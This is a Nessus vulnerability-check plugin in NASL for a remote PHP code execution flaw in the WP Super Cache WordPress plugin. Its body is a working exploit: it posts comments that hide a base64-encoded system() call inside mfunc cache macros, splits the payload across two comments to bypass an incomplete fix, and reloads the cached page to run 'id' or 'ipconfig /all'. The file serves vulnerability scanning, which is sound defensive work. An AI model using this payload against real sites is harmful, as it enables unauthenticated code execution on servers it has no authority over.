#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66305);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_cve_id("CVE-2013-2009", "CVE-2013-2011");
  script_bugtraq_id(59470, 59473, 59493);
  script_osvdb_id(92743);

  script_name(english:"WP Super Cache Plugin for WordPress Multiple Insecure PHP Code Inclusion Macros Remote Code Execution");
  script_summary(english:"Attempts to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote PHP code injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WP Super Cache Plugin for WordPress installed on the remote host
is affected by a remote PHP code execution vulnerability due to a
failure to properly sanitize user-supplied input. An unauthenticated,
remote attacker can submit a comment to a WordPress blog containing
arbitrary PHP code. The blog comments can contain dynamic content that
is ignored by the WordPress core, but when the cached version of the
page is loaded, the code left in the comment will execute. This allows
the attacker to execute arbitrary code, subject to the privileges of
the web server user id.

This issue exists because of an incomplete fix for CVE-2013-2009.

Note that the plugin is reportedly also affected by a cross-site
scripting vulnerability; however, Nessus has not tested for this
issue.

Also note that this plugin will post comments to the site, and it is
recommended that the comments are removed from within the WordPress
admin panel.");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/support/topic/pwn3d");
  # http://blog.futtta.be/2013/04/18/wp-caching-plugin-vulnerability-debrief/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?30117468");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/extend/plugins/wp-super-cache/changelog/");

  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.3.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/04/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/05/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "wordpress_wp_super_cache_143_xss.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'WP Super Cache';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

vuln = FALSE;

res2 = http_send_recv3(
  method       : "GET",
  item         : dir + "/feed/",
  port         : port,
  exit_on_fail : TRUE,
  follow_redirect : 1
);

# Grab a URL to a page with comments
# Set a default page ID if we don't find one from the RSS feed
page_id = "1";
page = eregmatch(pattern:'<guid isPermaLink="false">(.+)</guid>', string:res2[2]);
if (!isnull(page))
{
  get_id = eregmatch(pattern:'\\?p=([0-9]+)', string:page[1]);
  if (!isnull(get_id))
  {
    page_id = get_id[1];
  }
}

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

# Variables used in the foreach loop
time =  unixtime();
script  = SCRIPT_NAME - ".nasl" + "-" + time;
user = "Nessus-" + time;
i = 0;
page_url = "/?p=" + page_id + "#comments";

foreach cmd (cmds)
{
  b64_cmd = base64(str:"system('"+cmd+"');");
  # Remove the = character from the base64 encoded string as this will
  # cause a 500 error when requesting the page with our comment
  if ("=" >< b64_cmd)
  {
    b64_cmd = str_replace(string:b64_cmd, find:"=", replace:"");
  }

  attack = script +
    " <!--mfunc eval(base64_decode(" +b64_cmd+ ")); -->";
  attack2 = "<!--/mfunc--> " + script + i;

  payload = "author="+user+"&email="+user+"%40localhost.local&url=&comment=" +
    attack + "&submit=Post+Comment&comment_post_ID=" + page_id +
    "&comment_parent=0";

  payload2 = "author="+user+"&email="+user+"%40localhost.local&url=&comment=" +
    attack2 + "&submit=Post+Comment&comment_post_ID=" + page_id +
    "&comment_parent=0";

  # version 3.0 and 3.1 included incomplete fixes that could be bypassed
  # by splitting the attack up in seperate comments so 2 POST's are used
  res3 = http_send_recv3(
    method : "POST",
    item   : dir + "/wp-comments-post.php",
    port   : port,
    data   : payload,
    add_headers  : make_array(
      "Content-Type","application/x-www-form-urlencoded"),
    exit_on_fail : TRUE
  );

  if ("<p>Sorry, you must be logged in to post a comment." >< res3[2])
  {
    exit(0, "Nessus was unable to test for this issue as authentication " +
      "is required in order to post comments on the page at " +
      install_url + page_url + "."
    );
  }
  else if ("<p>Sorry, comments are closed for this item" >< res3[2])
  {
    exit(0, "Nessus was unable to test for this issue as comments are not " +
      "currently allowed on the page at " + install_url + page_url + "."
    );
  }
  else
  {
    attack_request = http_last_sent_request();
  }

  # Prevent errors from posting comments too quickly
  sleep(15);

  res3_2 = http_send_recv3(
    method : "POST",
    item   : dir + "/wp-comments-post.php",
    port   : port,
    data   : payload2,
    add_headers  : make_array(
      "Content-Type","application/x-www-form-urlencoded"),
    exit_on_fail : TRUE
  );
  attack_request2 = http_last_sent_request();

  # Send our GET request twice as the cached comment will execute on our
  # next load of the page
  res4 =  http_send_recv3(
    method : "GET",
    item   : dir + page_url,
    port   : port,
    exit_on_fail    : TRUE,
    follow_redirect : 1
  );
  res4 = http_send_recv3(
    method : "GET",
    item   : dir + page_url,
    port   : port,
    exit_on_fail    : TRUE,
    follow_redirect : 1
  );

  # If comment moderation is on, you need to cookie from the request in order
  # to see the output when manually testing this from the report output.
  verify_output = http_last_sent_request();

  if(
    (script >< res4[2]) &&
    (egrep(pattern:cmd_pats[cmd], string:res4[2]))
  )
  {
    vuln = TRUE;
    output = strstr(res4[2], script);

    if (cmd == 'id')
    {
      out = strstr(output, "uid");
      pos = stridx(out, "<!--/mfunc-->");
      if (pos < 0)
        output = out;
      else
        output = substr(out, 0, pos-1);
    }
    else
    {
      out = strstr(output, "Windows IP");
      pos = stridx(out, "<!--/mfunc-->");
      if (pos < 0)
        output = out;
      else
        output = substr(out, 0, pos-1);
    }
    break;
  }
  # Prevent errors from posting comments too quickly
  sleep(15);
  # increment after first pass to ensure we don't run into an issue with
  # duplicate comments
  i++;
}

if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

extra =
  'Note that two requests are used in the attack in order to bypass'+
  '\nthe incomplete fix in versions 1.3.x < 1.3.2.' +
  '\n' +
  '\nAdditionally, in cases where comment moderation is enabled, the' +
  '\ncookie value from the HTTP GET request is needed in order to view' +
  '\nand verify the results in the HTML page source.';

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  rep_extra   : extra,
  request     : make_list(attack_request, attack_request2, verify_output),
  output      : chomp(output)
);
